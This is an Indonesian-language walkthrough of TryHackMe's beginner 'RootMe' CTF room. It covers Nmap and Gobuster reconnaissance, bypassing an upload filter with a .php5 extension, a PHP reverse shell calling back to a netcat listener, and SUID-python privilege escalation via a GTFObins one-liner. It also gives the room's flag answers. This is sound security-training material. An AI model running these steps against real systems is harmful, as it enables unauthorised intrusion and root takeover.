# TryHackMe — RootMe Write-Up

> **"A CTF for beginners, Can you root me?"**

- **Link Room:** [RootMe](https://tryhackme.com/room/rrootme)

---

## Akses Awal

- **IP Attacker:** `10.2.79.42`
- **IP Mesin Target:** `10.10.76.241`

---

## Task 1 — Deploy the Machine

> *Hubungkan ke jaringan TryHackMe dan deploy mesin. Jika kamu belum tahu caranya, selesaikan room [OpenVPN](https://tryhackme.com/room/openvpn) terlebih dahulu.*

**1. Deploy the Machine**

 Jawaban: **No Answer Required**

---

## Task 2 — Reconnaissance (Pengintaian)

> *Pertama, mari kita kumpulkan informasi tentang target.*

Ketika mendapat tugas untuk mengeksploitasi sebuah target, langkah awal adalah mengidentifikasi layanan apa saja yang sedang berjalan. Untuk itu, kita akan menggunakan tool **Nmap** beserta opsi-opsinya untuk menemukan layanan yang aktif di mesin target.

### Nmap Scan

**Perintah:**
```bash
nmap -sV -sC 10.10.76.241
```

**Penjelasan Opsi:**

| Opsi | Fungsi |
|------|--------|
| `-sV` | Deteksi versi layanan |
| `-sC` | Menjalankan skrip default |

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 10.10.76.241
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:4d:ef:56:e5:d6:ab:cd (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d8:e0 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Dari hasil scan Nmap di atas, kita mendapatkan informasi tentang port-port yang terbuka beserta layanan yang berjalan. Dengan informasi ini, kita dapat menjawab pertanyaan-pertanyaan berikut.

**1. Scan mesin, berapa banyak port yang terbuka?**

 Jawaban: **2**

**2. Versi Apache apa yang sedang berjalan?**

 Jawaban: **2.4.29**

**3. Layanan apa yang berjalan di port 22?**

 Jawaban: **ssh**

---

Setelah melakukan Port Scan, kita menemukan dua port terbuka dan salah satunya menjalankan web server. Mari akses server tersebut melalui browser — tampilannya adalah halaman web berjudul **"HackIT - Home"** dengan tulisan *"Can you root me?"*.

Sekarang mari lakukan **brute force** direktori tersembunyi menggunakan **Gobuster**.

### Gobuster — Directory Brute Force

**Perintah:**
```bash
gobuster dir -u http://10.10.76.241/ -w /usr/share/wordlists/dirb/common.txt -t 5
```

**Penjelasan Opsi:**

| Opsi | Fungsi |
|------|--------|
| `dir` | Melakukan brute force direktori |
| `-u` | URL Target |
| `-w` | Wordlist (bawaan Kali Linux) |
| `-t` | Threads (paralelisasi) |

**Output:**
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Medhurst (@_ChrsMedh)
===============================================================
[+] Url:            http://10.10.76.241/
[+] Threads:        5
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
/css          (Status: 301) [Size: 312] [--> http://10.10.76.241/css/]
/js           (Status: 301) [Size: 311] [--> http://10.10.76.241/js/]
/panel        (Status: 301) [Size: 314] [--> http://10.10.76.241/panel/]
/uploads      (Status: 301) [Size: 316] [--> http://10.10.76.241/uploads/]
/index.php    (Status: 200) [Size: 616]
               (Status: 403) [Size: 278]
===============================================================
```

**Penjelasan Status Code:**

| Status | Arti |
|--------|------|
| `403` | Kamu tidak bisa mengaksesnya |
| `200` | Kamu bisa mengunjunginya |
| `301` | Redirect ke tempat lain |

Kita menemukan beberapa direktori dengan status 301. Mari periksa satu per satu:

- **`/css/`** — Hanya berisi file-file CSS biasa, tidak ada yang menarik.
- **`/js/`** — Hanya berisi file JavaScript biasa.
- **`/panel/`** — Ini yang menarik! Berisi halaman upload file yang bisa kita manfaatkan.

**4. Temukan direktori di web server menggunakan tool GoBuster.**

 Jawaban: **No Answer Needed**

**5. Apa direktori tersembunyi yang ditemukan?**

 Jawaban: **`/panel/`**

---

## Task 3 — Getting a Shell (Mendapatkan Shell)

> *Temukan form untuk upload dan dapatkan reverse shell, kemudian temukan flag-nya.*

Kita telah menemukan halaman upload di `/panel/`. Mari kita coba berbagai ekstensi file untuk mengetahui mana yang diizinkan server. Percobaan pertama dengan file `.txt` berhasil — server menerimanya.

Sekarang kita akan mencoba mengirim **payload** reverse shell menggunakan file PHP.

### Menyiapkan Payload

1. Ambil payload PHP reverse shell dari:
    [GitHub — pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

2. Buat file bernama `shell.php`, lalu salin payload ke dalamnya.

3. Ubah baris berikut di dalam file sesuai dengan IP attacker kamu:

```php
$ip = '10.2.79.42';   // Ganti dengan IP Attack Box kamu
$port = 1234;          // Port listener (default 1234)
```

### Bypass Filter Ekstensi

Setelah mencoba upload `shell.php`, server menolak dengan pesan:
```
PHP is not permitted!
```

Kita coba ekstensi lain:

| Ekstensi | Hasil |
|----------|-------|
| `.txt` |  Berhasil diupload |
| `.jpg` |  Berhasil diupload |
| `.php` |  Ditolak server |
| `.php5` |  Berhasil diupload |

Server hanya memfilter ekstensi `.php` secara spesifik. Jadi kita rename file menjadi `shell.php5` dan upload — **berhasil!**

Setelah upload, file bisa ditemukan di direktori:
```
http://10.10.76.241/uploads/shell.php5
```

### Setup Netcat Listener

Buka terminal baru dan jalankan:

```bash
nc -lvnp 1234
```

Kemudian akses file yang sudah diupload melalui browser:
```
http://10.10.76.241/uploads/shell.php5
```

**Output Netcat (koneksi masuk):**
```
listening on [any] 1234 ...
connect to [10.2.79.42] from (UNKNOWN) [10.10.76.241] 45234
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:23:11 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE JOST  PCPU CPU COMMAND
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Kita berhasil masuk ke sistem! Perintah `whoami` menunjukkan kita berjalan sebagai user **`www-data`**.

### Mencari Flag User

```bash
$ whoami
www-data

$ find / -name user.txt 2>/dev/null
/var/www/user.txt

$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

**1. user.txt**

 Jawaban: **`THM{y0u_g0t_a_sh3ll}`**

---

## Task 4 — Privilege Escalation (Eskalasi Hak Akses)

> *Sekarang kita sudah punya shell, mari eskalasi hak akses kita ke root.*

Tujuan selanjutnya adalah mendapatkan akses **root**. Kita akan mencari file-file dengan **bit SUID** yang dimiliki oleh root.

> **Penjelasan SUID:** File dengan bit SUID, ketika dijalankan, akan mewarisi izin pemiliknya. Jika kita menemukan binary milik root dengan bit SUID, kita bisa memanfaatkannya untuk meningkatkan hak akses.

### Mencari File dengan SUID

```bash
$ find / -user root -perm /4000 2>/dev/null
```

**Output:**
```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python                   <-- INI YANG ANEH!
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

Kita menemukan **`/usr/bin/python`** memiliki bit SUID — ini tidak normal dan bisa dieksploitasi!

**1. Cari file dengan permission SUID, file mana yang aneh?**

Jawaban: **`/usr/bin/python`**

---

### Eksploitasi dengan GTFObins

Kunjungi [**GTFObins**](https://gtfobins.github.io/) dan cari "python" → pilih bagian **SUID**.

GTFObins memberikan perintah eksploit berikut:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Jalankan perintah tersebut di shell kita:

```bash
$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Verifikasi Root dan Menemukan Flag

```bash
# whoami
root

# cd /root
# ls
root.txt

# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

**2. root.txt**

Jawaban: **`THM{pr1v1l3g3_3sc4l4t10n}`**

---

## SELAMAT! Room Berhasil Ditaklukkan!

Kita telah berhasil menyelesaikan room **RootMe** di TryHackMe!

### Rangkuman Serangan

| Tahap | Teknik | Tool |
|-------|--------|------|
| Reconnaissance | Port scanning | Nmap |
| Enumeration | Directory brute force | Gobuster |
| Initial Access | File upload bypass (.php5) + Reverse shell | PHP Reverse Shell + Netcat |
| Privilege Escalation | SUID exploitation via Python | GTFObins |

**RootMe CTF** sangat cocok untuk pemula. Sangat disarankan bagi semua yang baru memulai perjalanan di dunia CTF dan cybersecurity untuk mencoba room ini!

---

## Referensi

- 🔗 [TryHackMe — RootMe Room](https://tryhackme.com/room/rrootme)
- 🔗 [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
- 🔗 [GTFObins](https://gtfobins.github.io/)
